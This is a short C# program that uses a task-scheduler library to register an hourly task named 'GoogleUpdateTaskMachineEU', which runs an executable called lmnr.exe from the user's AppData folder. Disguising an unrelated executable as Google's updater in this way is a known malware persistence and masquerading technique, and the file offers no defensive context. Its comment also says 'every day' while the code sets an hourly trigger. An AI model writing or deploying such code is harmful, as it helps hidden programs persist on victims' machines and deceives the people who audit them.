﻿using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

namespace TaskSch
{
   

    class Program
    {
       

        public static String build_exe = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\lmnr.exe";
   

        static void Main(string[] args)

        {


            // Run a program every day on the local machine
           TaskService.Instance.AddTask("GoogleUpdateTaskMachineEU", QuickTriggerType.Hourly, build_exe, "");
        }
    }
}
